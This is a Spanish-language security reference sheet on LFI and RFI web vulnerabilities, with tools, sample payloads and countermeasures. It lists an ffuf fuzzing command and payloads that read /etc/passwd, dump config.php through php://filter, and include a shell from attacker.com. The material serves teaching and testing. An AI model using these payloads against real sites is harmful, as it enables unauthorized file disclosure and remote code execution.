# Análisis de Vulnerabilidades: Local File Inclusion (LFI) & Remote File Inclusion (RFI)

## Descripción
Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web permite que un usuario controle la ruta de un archivo que se incluye o carga en el servidor. El Local File Inclusion (LFI) permite leer archivos sensibles locales del servidor (como `/etc/passwd`), mientras que el Remote File Inclusion (RFI) permite incluir archivos externos, lo que puede llevar a la ejecución remota de código (RCE).

## Clasificación
- **Fase**: Análisis de Vulnerabilidades
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **Burp Suite** (Intruder) — Automatización de envío de payloads para la detección de inclusión de archivos.
- **ffuf** — Fuzzer de línea de comandos rápido para descubrir parámetros vulnerables a LFI/RFI.
- **SecLists** — Repositorio de payloads especializados para la detección de vulnerabilidades de inclusión.
- **Navegador** — Utilizado para la validación manual de la carga y ejecución de archivos.

## Comandos / Ejemplos
Fuzzing básico de LFI con `ffuf` y SecLists:
```bash
ffuf -u http://target.com/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:0:0"
```

Prueba manual de LFI (Linux):
```
http://target.com/view.php?file=../../../../etc/passwd
```

Prueba manual de LFI con filtros de PHP (Base64):
```
http://target.com/view.php?file=php://filter/convert.base64-encode/resource=config.php
```

Prueba manual de RFI:
```
http://target.com/view.php?file=http://attacker.com/shell.txt
```

## Contramedidas
- Implementar una lista blanca (Whitelisting) de archivos permitidos para inclusión.
- Deshabilitar `allow_url_include` en la configuración de PHP (`php.ini`).
- Utilizar funciones de sistema de archivos que no permitan el acceso directo a rutas dinámicas.
- Validar rigurosamente las entradas del usuario y evitar el uso de rutas relativas.

## Referencias
- Harper, A., et al. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook*. McGraw-Hill Education.
- Kim, P. (2018). *The Hacker Playbook 3: Practical Guide To Penetration Testing*. Secure Planet, LLC.
